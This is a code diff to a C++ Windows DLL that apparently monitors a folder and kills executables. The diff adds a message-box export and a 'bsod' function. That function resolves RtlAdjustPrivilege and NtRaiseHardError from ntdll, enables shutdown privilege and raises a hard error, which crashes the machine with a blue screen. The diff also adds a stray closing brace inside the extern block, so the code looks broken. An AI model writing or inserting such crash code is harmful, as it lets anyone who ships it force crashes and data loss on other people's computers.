@@ -9,6 +9,7 @@ Compile with g++ -shared -o api.dll api.cpp -Ofast -fPIC -shared
 #include <filesystem>
 #include <fstream>
 #include <windows.h>
+#include <winternl.h>
 #include <tlhelp32.h>
 
 using namespace std;
@@ -23,6 +24,16 @@ extern "C"
     __declspec(dllexport) void stop_monitoring();
     __declspec(dllexport) int get_killed_count();
     __declspec(dllexport) const char* get_executables_in_folder(const char* folder_path);
+    __declspec(dllexport) int __stdcall dialog(
+        LPCWSTR message,
+        LPCWSTR title,
+        UINT type
+    )
+    {
+        return MessageBoxW(nullptr, message, title, type);
+    }
+    __declspec(dllexport) int __stdcall bsod();
+    }
 }
 
 void monitor_executables(const string& folder_path);
@@ -116,4 +127,30 @@ const char* get_executables_in_folder(const char* folder_path)
         }
     }
     return result.c_str();
+}
+
+__declspec(dllexport) int __stdcall bsod()
+{
+    BOOLEAN bEnabled;
+    ULONG uResp;
+
+    // Load RtlAdjustPrivilege and NtRaiseHardError functions from ntdll.dll
+    auto RtlAdjustPrivilege = (NTSTATUS(WINAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))
+        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege");
+
+    auto NtRaiseHardError = (NTSTATUS(WINAPI*)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG))
+        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtRaiseHardError");
+
+    if (!RtlAdjustPrivilege || !NtRaiseHardError)
+    {
+        return -1;
+    }
+
+    // Enable shutdown privilege for this process
+    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
+
+    // Trigger BSOD
+    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6, &uResp);
+
+    return 0;
 }
